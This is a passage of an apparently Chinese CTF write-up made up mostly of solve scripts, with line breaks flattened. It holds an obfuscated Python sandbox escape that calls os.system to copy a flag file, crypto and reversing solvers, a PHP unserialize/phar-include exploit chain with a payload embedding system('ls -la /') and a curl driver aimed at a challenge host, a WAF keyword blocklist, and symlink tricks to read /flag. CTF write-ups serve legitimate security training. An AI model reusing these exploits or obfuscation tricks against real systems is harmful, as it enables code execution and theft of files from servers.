// 使用 HMAC SHA256 算法生成 token	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
// 使用密钥签名	tokenString, err := token.SignedString(jwtKey)if err != nil {panic(err)	}
	fmt.Println("Generated Token:", tokenString)}
def run():      return "test"
def run():    b = char(95)*2 + "builtins" + chr(95)*2    aaa = globals()[b]
    bbb = chr(95)*2 + "imp" + "ort" + chr(95)*2    imp = aaa[bbb]    ccc = imp("o"+"s")    ddd = chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)    return getattr(ccc, ddd)("cat /fl11lag >/tmp/aaa")
def run():    b = chr(95)*2 + "builtins" + chr(95)*2    bbb = globals()[b]    xxx = chr(111)+chr(112)+chr(101)+chr(110)    f = bbb[xxx]("/tmp/aaa","r")
    aaa = chr(114)+chr(101)+chr(97)+chr(100)    content = getattr(f,aaa)()    return content
from hashlib import *from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom secrets import flag, secret
assert secret < 2 ** 50p = 115792089237316195423570985008687907853269984665640564039457584007913129639747Q_components = (123456789, 987654321, 135792468, 864297531)
class Quaternion:    def __init__(self, a, b, c, d):        self.p = p        self.a = a % self.p        self.b = b % self.p        self.c = c % self.p        self.d = d % self.p
    def __repr__(self):        return f"Q({self.a}, {self.b}, {self.c}, {self.d})"
    def __mul__(self, other):        a1, b1, c1, d1 = self.a, self.b, self.c, self.d        a2, b2, c2, d2 = other.a, other.b, other.c, other.d        a_new = a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2        b_new = a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2        c_new = a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2        d_new = a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2        return Quaternion(a_new, b_new, c_new, d_new)
def power(base_quat, exp):    res = Quaternion(1, 0, 0, 0)    base = base_quat    while exp > 0:        if exp % 2 == 1:            res = res * base        base = base * base        exp //= 2    return res
Q = Quaternion(*Q_components)R = power(Q,secret)
print("--- Public Parameters ---")print(f"p = {p}")print(f"Q = {Q}")print(f"R = {R}")
'''--- Public Parameters ---p = 115792089237316195423570985008687907853269984665640564039457584007913129639747Q = Q(123456789, 987654321, 135792468, 864297531)R = Q(53580504271939954579696282638160058429308301927753139543147605882574336327145, 79991318245209837622945719467562796951137605212294979976479199793453962090891, 53126869889181040587037210462276116096032594677560145306269148156034757160128, 97368024230306399859522783292246509699830254294649668434604971213496467857155)'''
key = md5(str(secret).encode()).hexdigest().encode()cipher = AES.new(key=key,mode=AES.MODE_ECB)print(cipher.encrypt(pad(flag,16)))
# b'(xe4IJxfd4%xcfxadxb4x7fixaexdbZux6-xf4xd72x14BBx1exdcxb7xb7xd1xad#e@x17x1fx12xc4xe5xa6x10x91x08xd6x87x82Hx9e'
from hashlib import md5from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport mathfrom collections import defaultdict
# ---------------- Public parameters ----------------p = 115792089237316195423570985008687907853269984665640564039457584007913129639747Q_components = (123456789, 987654321, 135792468, 864297531)R_components = (    53580504271939954579696282638160058429308301927753139543147605882574336327145,    79991318245209837622945719467562796951137605212294979976479199793453962090891,    53126869889181040587037210462276116096032594677560145306269148156034757160128,    97368024230306399859522783292246509699830254294649668434604971213496467857155)
ciphertext = b'(xe4IJxfd4%xcfxadxb4x7fixaexdbZux6-xf4xd72x14BBx1exdcxb7xb7xd1xad#e@x17x1fx12xc4xe5xa6x10x91x08xd6x87x82Hx9e'
# ---------------- Quaternion arithmetic ----------------class Quaternion:    __slots__=("a","b","c","d")    def __init__(self,a,b,c,d):        self.a=a%p;self.b=b%p;self.c=c%p;self.d=d%p    def __mul__(self,other):        a1,b1,c1,d1 = self.a,self.b,self.c,self.d        a2,b2,c2,d2 = other.a,other.b,other.c,other.d        return Quaternion(            (a1*a2 - b1*b2 - c1*c2 - d1*d2)%p,            (a1*b2 + b1*a2 + c1*d2 - d1*c2)%p,            (a1*c2 - b1*d2 + c1*a2 + d1*b2)%p,            (a1*d2 + b1*c2 - c1*b2 + d1*a2)%p        )    def __eq__(self,other): return (self.a,self.b,self.c,self.d)==(other.a,other.b,other.c,other.d)    def __hash__(self): return hash((self.a,self.b,self.c,self.d))    def conjugate(self):        return Quaternion(self.a,-self.b,-self.c,-self.d)    def norm(self):        return (self.a*self.a + self.b*self.b + self.c*self.c + self.d*self.d) % p    def inverse(self):        n=self.norm()        n_inv=pow(n,-1,p)        qc=self.conjugate()        return Quaternion(qc.a*n_inv, qc.b*n_inv, qc.c*n_inv, qc.d*n_inv)
def power(base,exp):    res = Quaternion(1,0,0,0)    while exp>0:        if exp&1: res=res*base        base=base*base        exp//=2    return res
Q=Quaternion(*Q_components)R=Quaternion(*R_components)
# ---------------- Optimized BSGS ----------------def bsgs(base, target, bound):    m=int(math.isqrt(bound))+1    baby={}    cur=Quaternion(1,0,0,0)    for j in range(m):        # 存储时只存 tuple，避免 Quaternion 对象占内存        baby[(cur.a,cur.b,cur.c,cur.d)]=j        cur=cur*base        if j%500000==0 and j>0:            print(f"[*] Baby step {j}/{m}")    # giant step    factor = power(base.inverse(), m)    cur=target    for i in range(m+1):        t=(cur.a,cur.b,cur.c,cur.d)        if t in baby:            return i*m+baby[t]        cur=cur*factor        if i%100000==0 and i>0:            print(f"[*] Giant step {i}/{m}")    return None
# ---------------- Run ----------------N=1<<50secret=bsgs(Q,R,N)print("[+] Found secret:",secret)
# ---------------- Decrypt ----------------key=md5(str(secret).encode()).hexdigest().encode()cipher=AES.new(key,AES.MODE_ECB)plaintext=unpad(cipher.decrypt(ciphertext),16)print("[+] FLAG:",plaintext.decode())
byte_2120 = [    0x97,0xD5,0x60,0x43,0xB4,0x10,0x43,0x73,    0x0F,0xDA,0x43,0xCD,0xD3,0xE8,0x73,0x4A,    0x94,0xC3,0xCD,0x71,0xBD,0xDC,0x97,0x1A]
def rol(x, r, bits=8):    return ((x << r) & (2**bits-1)) | (x >> (bits-r))
def ror(x, r, bits=8):    return ((x >> r) | ((x << (bits-r)) & (2**bits-1)))
def sub_12A9(a1, a2):  # 左循环移位    return rol(a1, a2, 8)
def sub_12DE(a1, a2):  # 右循环移位    return ror(a1, a2, 8)
def sub_1313(a1):    if a1 == 0:        return 0    v2 = 1    v3 = 255    v4 = a1    while v3:        if v3 & 1:            v2 = (v4 * v2) % 257        v4 = (v4 * v4) % 257        v3 >>= 1    return v2
byte_2020 = [  0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,  0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,  0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,  0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,  0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,  0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,  0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,  0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,  0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,  0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,  0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,  0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,  0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,  0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,  0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,  0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,  0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,  0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,  0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,  0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,  0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,  0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,  0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,  0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,  0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,  0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,  0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,  0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,  0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,  0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,  0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,  0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16,]
def sub_13E1(a1):    # Step1 XOR 0x5A    t1 = a1 ^ 0x5A    # Step2 ROL3    v1 = sub_12A9(t1, 3)    # Step3 nibble mix    hi = (v1 >> 4) & 0xF    lo = v1 & 0xF    t = ((3 * hi) & 0xF) << 4 | ((5 * lo) & 0xF)    # Step4 mod 257 pow    v3 = sub_1313(t)    # Step5 ror2    idx = sub_12DE(v3, 2) & 0xFF    # Step6 lookup S-box    return byte_2020[idx]
def invert_table():    mapping = {}    for x in range(256):        y = sub_13E1(x)        mapping[y] = x    return mapping
mapping = invert_table()
flag_bytes = []for b in byte_2120:    if b in mapping:        flag_bytes.append(mapping[b])    else:        flag_bytes.append(ord('?'))  # 未找到情况(理论上不会)
def ror(x, r, bits=8):    return ((x >> r) | ((x << (bits-r)) & (2**bits-1))) & 0xFF
# mapping 已生成，byte_2120 已提取
flag_bytes = []for i, b in enumerate(byte_2120):    tmp = mapping[b]         # 得到 sub_1492 的输出    k = (i % 7) + 1    orig = ror(tmp, k)       # 逆 sub_1492    flag_bytes.append(orig)
print(bytes(flag_bytes))
<?phphighlight_file(__FILE__);
function waf($data){    if (is_array($data)){        die("Cannot transfer arrays");    }    if (preg_match('/<?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i', $data)) {        die("You can't do");    }}
class Coral{    public $pivot;
    public function __set($k, $value) {        $k = $this->pivot->ctor;        echo new $k($value);    }}
class Nimbus{    public $handle;    public $ctor;
    public function __destruct() {        return $this->handle();    }    public function __call($name, $arg){        $arg[1] = $this->handle->$name;    }}
class Zephyr{    public $target;    public $payload;    public function __get($prop)    {        $this->target->$prop = $this->payload;    }}
class Acheron {    public $mode;
    public function __destruct(){        $data = $_POST[0];        if ($this->mode == 'w') {            waf($data);            $filename = "/tmp/".md5(rand()).".phar";            file_put_contents($filename, $data);            echo $filename;        } else if ($this->mode == 'r') {            waf($data);            $f = include($data);            if($f){                echo "It is file";            }            else{                echo "You can look at the others";            }        }    }}
if(strlen($_POST[1]) < 52) {    $a = unserialize($_POST[1]);}else{    echo "str too long";}
?>
<?phpini_set('phar.readonly', 0);// 生成PHAR文件@unlink("exp.phar");@unlink("exp.phar.gz");$phar = new Phar("exp.phar");$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>");$phar->addFromString("ls",'<?php system("ls -la /"); ?>');$phar->stopBuffering();$phar->compress(Phar::GZ);
echo "PHAR file generated successfullyn";?>
<?php$target = "http://web-6b7ebd8df7.challenge.xctf.org.cn/"; // ★ 改成题目地址
// // 第一次：上传 phar 文件$ch = curl_init();$post = [    "0" => file_get_contents("exp.phar.gz"),//new CURLFile("exp.phar", "application/octet-stream", "exp.phar"),    // 注意这里用 serialize 构造 Acheron 对象    "1" => 'O:7:"Acheron":1:{s:4:"mode";s:1:"w";}'];curl_setopt_array($ch, [    CURLOPT_URL => $target,    CURLOPT_RETURNTRANSFER => true,    CURLOPT_POST => true,    CURLOPT_POSTFIELDS => $post]);
$response = curl_exec($ch);curl_close($ch);
echo "[*] Upload response:n$responsen";
// 从返回中提取 /tmp/xxx.phar 路径if (preg_match("#(/tmp/[0-9a-f]+.phar)#", $response, $m)) {    $phar_path = $m[1];    echo "[*] Got phar path: $phar_pathn";
    // 第二次：触发 include    $ch = curl_init();    $post2 = [        "0" => 'phar://'.$phar_path."/ls",        "1" => 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}'    ];    curl_setopt_array($ch, [        CURLOPT_URL => $target,        CURLOPT_RETURNTRANSFER => true,        CURLOPT_POST => true,        CURLOPT_POSTFIELDS => $post2    ]);    $resp2 = curl_exec($ch);    curl_close($ch);
    echo "[*] Trigger response:n$resp2n";}
>/var/www/html/-L # 创建一个-L文件，达到cp -P -L /var/www/html/backup/的目的ln -s /flag /var/www/html/zzzls -la /var/www/html/backup
cat /var/www/html/backup/zzz
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473714-wxsync-2025-09-026fc28631b80bc97b75c859f161d20f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473716-wxsync-2025-09-878e18bbfd8449b5b07a54c4ac0f9611.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473719-wxsync-2025-09-38c2f48fca9c4b44be8455af31e1260c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473720-wxsync-2025-09-9940571138931495b1ac24700e7dee4a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473722-wxsync-2025-09-5e66f016ed3e7553ee08147e31e6837b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473724-wxsync-2025-09-704c4da1125df32d902f14447a4cf45e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473725-wxsync-2025-09-44da2e48b9100a78028aedf24f24007d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473726-wxsync-2025-09-cf3676d7cafb513f07b2704e030a449e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473728-wxsync-2025-09-2f5bc5ad7dcc9a0d3168d50cffcaf70c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1757473729-wxsync-2025-09-2f5bc5ad7dcc9a0d3168d50cffcaf70c.png)